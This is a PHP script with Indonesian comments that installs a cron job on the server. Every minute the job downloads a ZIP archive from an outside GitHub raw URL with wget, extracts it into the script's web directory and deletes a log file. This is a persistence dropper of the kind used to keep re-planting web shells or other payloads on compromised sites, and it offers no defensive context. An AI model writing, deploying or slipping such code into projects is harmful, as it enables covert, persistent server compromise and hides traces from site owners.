<?php
// URL yang ingin Anda unduh
$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/geleri.zip';

// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Nama file ZIP setelah diunduh
$zipFileName = $currentDirectory . '/geleri.zip';

// Buat perintah wget
$downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($zipFileName);

// Perintah untuk mengekstrak file ZIP
$extractCommand = 'unzip ' . escapeshellarg($zipFileName) . ' -d ' . escapeshellarg($currentDirectory);

// Tugas Cron untuk mengunduh dan mengekstrak file setiap 30 detik dan kemudian menghapus log
$downloadCronCommand = '* * * * * ' . $downloadCommand . ' && ' . $extractCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');

// Eksekusi perintah cron dan tangani hasilnya
exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -', $output, $returnVar);

// Cek apakah perintah cron berhasil ditambahkan
if ($returnVar === 0) {
    echo "Cron job berhasil ditambahkan!\n";
} else {
    echo "Gagal menambahkan cron job. Periksa izin dan konfigurasi Cron Anda.\n";
}

// Cek apakah ada output dari eksekusi perintah cron
if (!empty($output)) {
    echo "Output dari cron job:\n";
    foreach ($output as $line) {
        echo $line . "\n";
    }
} else {
    echo "Tidak ada output dari cron job.\n";
}
?>
